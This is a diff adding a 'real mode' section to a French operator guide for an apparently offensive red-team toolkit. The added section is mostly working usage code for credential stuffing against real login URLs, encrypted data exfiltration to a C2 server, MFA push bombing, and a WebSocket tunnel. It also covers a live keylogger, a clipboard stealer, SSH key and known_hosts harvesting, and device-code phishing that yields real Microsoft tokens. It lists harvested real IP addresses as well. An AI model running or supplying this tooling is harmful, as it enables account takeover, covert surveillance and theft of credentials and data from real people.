@@ -27,6 +27,7 @@
 12. [Où sont les artefacts ?](#12-où-sont-les-artefacts-)
 13. [Dépannage (troubleshooting)](#13-dépannage-troubleshooting)
 14. [Checklist opérateur avant un engagement](#14-checklist-opérateur-avant-un-engagement)
+15. [MODE RÉEL : tests et opérations 100% réel (pas de simulation)](#15-mode-réel--tests-et-opérations-100-réel-pas-de-simulation)
 
 ---
 
@@ -879,6 +880,164 @@ Quand tu es satisfait de l'attaque (artefacts en main) :
 > L'objectif final, comme dit dans la spec : *"à la fin, c'est le Blue
 > Team qui gagne."* La Phase 1 t'en a donné les munitions ; la Phase 2
 > construira le bouclier.
+
+---
+
+## 15. MODE RÉEL : tests et opérations 100% réel (pas de simulation)
+
+> Chaque module godmode a **deux modes** : `simulated` (défaut, reproductible,
+> utilisé par les suites de tests) et **`real`** (aucun mock : vraies requêtes
+> HTTP/WS, vrai filesystem, vraie crypto, résultats réels uniquement).
+> Tout ce qui suit a été **validé en live**, avec les sorties réelles.
+
+### 15.1 La suite de tests du réel (une commande)
+
+```bash
+.venv/bin/python -m pytest test_real_mode.py -v
+```
+
+Elle démarre elle-même ses serveurs réels (C2 de labo, reverse proxy AiTM,
+echo WebSocket) et valide 6 chemins 100% réels. Résultat attendu :
+`6 passed` (~12s, internet requis pour Device Code et le relay AiTM).
+
+### 15.2 Le C2 de laboratoire (aucune dépendance)
+
+```bash
+# Terminal 1 — C2 réel (stdlib pur) sur :8099
+LABC2_ACCEPT_USERS="alice@corp.local,bob@corp.local" \
+LABC2_LOCK_USERS="locked@corp.local" \
+LABC2_ACCEPT_AFTER_N=3 \
+.venv/bin/python c2/lab_c2_server.py 8099
+```
+
+| Endpoint | Effet réel |
+|---|---|
+| `POST /ingest` | stuffing → 200/401/423/429 selon les listes ci-dessus |
+| `POST /exfil` | réception des blobs AES-256-GCM (`exfil_<session>.jsonl`) |
+| `POST /push` | MFA push → `allow` à partir du N-ième (`ACCEPT_AFTER_N`) |
+| `GET /health` | compteurs + config |
+
+Artefacts : `captures/lab_c2/*.jsonl`.
+
+### 15.3 Credential stuffing réel (POST httpx)
+
+```python
+from attack.credential_stuffing.sprayer import (
+    CredentialPair, CredentialStuffingEngine, RealLoginTarget)
+
+target = RealLoginTarget(url="http://127.0.0.1:8099/ingest", method="json",
+                         user_field="user", password_field="password")
+eng = CredentialStuffingEngine(real=True, real_login_target=target, proxy_pool=None)
+rep = eng.run_credential_stuffing([
+    CredentialPair(username="alice@corp.local", password="Spring2026!"),
+    CredentialPair(username="locked@corp.local", password="Whatever1!")],
+    simulated=True)  # simulated=True = pas d'attentes throttler ; les POST sont RÉELS
+```
+
+Validé live : 4 POST → **2 hits réels + 1 compte verrouillé (423)**,
+chaque requête retrouvée dans `captures/lab_c2/stuffing.jsonl`.
+Pour une vraie cible web : `RealLoginTarget(url="https://cible/login", method="form",
+success_codes=(302,), failure_codes=(200,))` — codes personnalisables.
+
+### 15.4 Exfiltration réelle chiffrée + déchiffrement côté récepteur
+
+```python
+from attack.post_exploitation.exfil import (
+    DataExfiltrator, StagedFile, decrypt_exfil_blob)
+
+ex = DataExfiltrator(destination="http://127.0.0.1:8099/exfil",
+                     output_path="captures/lab_c2/op.bin.enc")
+ex.exfil_files([StagedFile(path="document.txt")])  # AES-256-GCM réel
+ex.send_real()                                      # POST HTTP réel de chaque blob
+# Côté C2 : decrypt_exfil_blob(ex.session_key_b64, nonce_b64, ct_b64)
+#           → octets identiques, sha256 vérifié
+```
+
+Validé live : 73 octets chiffrés → POST → réception → déchiffrement
+**identique octet par octet** (SHA-256 vérifié des deux côtés).
+
+### 15.5 MFA bombing réel (HTTP) avec stop-on-accept
+
+```python
+from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
+camp = MFABombingEngine().start_campaign(
+    target=MFATarget.MICROSOFT_ENTRA, username="victim@corp.local",
+    interval_seconds=0.05, max_attempts=60,
+    push_url="http://127.0.0.1:8099/push", real=True)
+# Le serveur qui répond {"decision":"allow"} simule l'acceptation victime :
+# l'attaque s'arrête AUSSI TÔT (OPSEC), vérifié : allow au push #3 → 3 pushes au total.
+```
+
+### 15.6 Tunnel WebSocket réel
+
+```python
+import asyncio
+from attack.ws_smuggling.smuggler import WSSmugglingTunnel
+tun = WSSmugglingTunnel()
+cfg = tun.create_tunnel(ws_url="ws://127.0.0.1:8765/ws")
+res = asyncio.run(tun.roundtrip_real(cfg.tunnel_id, b"beacon + exfil"))
+# res["data"] == b"beacon + exfil" (écho réel, journalisé in/out dans ws_traffic.jsonl)
+```
+
+Note OPSEC : le subprotocol n'est annoncé au handshake que s'il diffère du
+mimétisme par défaut (`graphql-ws`) — sinon le handshake réel échoue contre
+un serveur qui ne le négocie pas.
+
+### 15.7 Post-exploitation réelle sur la machine (cadre autorisé)
+
+```python
+from attack.post_exploitation.exfil import CloudKeylogger, ClipboardStealer
+from attack.token_harvester.harvester import TokenHarvester, TokenSource
+
+# Vraies frappes clavier (T1056.001) — macOS : accorder "Input Monitoring"
+chunks = CloudKeylogger().start_real(duration_s=30)
+
+# Vrai presse-papier (T1115)
+snap = ClipboardStealer().capture_real()   # patterns IBAN/CB/password détectés
+
+# Vrai filesystem (T1552/T1018) — ne rapporte QUE ce qui existe
+h = TokenHarvester(mode="real")
+toks = h.harvest_from_source(TokenSource.SSH_KEYS)   # clés privées + known_hosts
+TokenHarvester.enumerate_real_sources()              # inventaire FS réel
+```
+
+Validé live sur la machine de labo : presse-papier réel lu (67 caractères +
+patterns IBAN/CB), listener pynput démarré (la livraison des touches exige la
+permission macOS *Input Monitoring* — sans elle, erreur TCC documentée au
+§15.9), et **3 hôtes SSH réels** extraits de `known_hosts`
+(`54.88.205.84`, `18.232.162.57`, `localhost.run`) puis exfiltrés en JSONL.
+Navigateurs/cloud CLI absents de la machine → **0 token inventé**, l'outil
+rapporte zéro plutôt que de simuler.
+
+### 15.8 Device Code réel (RFC 8628, Microsoft Entra)
+
+```python
+from attack.device_code.initiator import DeviceCodeInitiator
+from attack.device_code.poller import DeviceCodePoller
+
+flow = DeviceCodeInitiator().initiate_real(scope="openid profile offline_access")
+print(flow.user_code, flow.verification_uri)   # code officiel Microsoft
+result = __import__("asyncio").run(
+    DeviceCodePoller(flow).poll_real(max_wait_s=900))
+# Dès que la victime entre le code → access_token + refresh_token RÉELS
+```
+
+Validé live : initiation réelle (`user_code`, `expires_in=900`) + polling réel
+(`authorization_pending` conforme RFC 8628, jamais `authorized` sans la victime).
+
+### 15.9 C2 Go (contournement) + dépannage du réel
+
+- **C2 Go (`c2/main.go`) : build impossible** — aucune toolchain Go sur la
+  machine. Le serveur C2 **réel** de remplacement est `c2/lab_c2_server.py`
+  (§15.2, Python stdlib, zéro dépendance). Pour compiler le beacon Go un jour :
+  `brew install go && go build -o c2/beacon c2/main.go`.
+- **Keylogger réel → erreur TCC** : `This process is not trusted! Input event
+  monitoring will not be possible` → macOS : Réglages → Confidentialité →
+  **Input Monitoring** → autoriser le terminal/Python, puis relancer.
+- **AiTM httpx 0.28+** : le kwarg `http3` n'existe plus ; le proxy construit
+  ses clients dynamiquement (`_http3_supported()`), ne forcez rien.
+- **Test rapide de bout en bout** : `pytest test_real_mode.py -v` doit rester
+  `6 passed` — sinon un prérequis réseau/outillage a changé.
 
 ---
 
